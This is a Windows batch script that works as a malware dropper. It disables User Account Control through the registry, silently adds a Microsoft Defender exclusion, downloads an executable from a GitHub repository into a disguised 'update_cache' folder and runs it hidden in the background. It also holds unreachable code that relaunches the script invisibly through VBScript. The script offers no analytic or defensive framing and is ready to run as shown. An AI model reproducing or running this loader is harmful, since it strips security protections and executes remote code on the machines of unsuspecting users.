@echo off
setlocal enabledelayedexpansion

:: Create a random file name using date and time
for /f "tokens=2 delims==" %%I in ('"wmic os get localdatetime /value"') do set datetime=%%I
set randomExeName=%datetime:~8,4%%datetime:~4,2%%datetime:~6,2%%datetime:~2,2%%datetime:~0,2%.exe

set "folderPath=%USERPROFILE%\AppData\Local\update_cache"
set "exePath=%folderPath%\%randomExeName%"

:: Create folder if not exists
if not exist "%folderPath%" mkdir "%folderPath%"

:: Disable User Account Control (UAC) for elevation
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: Use PowerShell to add exclusion for the executable (without opening PowerShell window)
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess '%exePath%'" >nul 2>&1

:: Download the executable file silently with random name
curl -L -o "%exePath%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/vmtest.exe" >nul 2>&1
if %errorlevel% neq 0 exit /b 1

:: Check if the file is downloaded and not empty
if not exist "%exePath%" exit /b 1
for %%F in ("%exePath%") do set filesize=%%~zF
if "%filesize%"=="0" exit /b 1

:: Run the executable silently in the background
start "" /b "%exePath%"
exit

:: Create VBScript to run batch silently
echo Set objShell = CreateObject("WScript.Shell") > "%TEMP%\run_silently.vbs"
echo objShell.Run """%~f0""", 0, False >> "%TEMP%\run_silently.vbs"

:: Execute the VBScript
wscript "%TEMP%\run_silently.vbs"

:: Clean up VBScript after execution
del "%TEMP%\run_silently.vbs"
exit
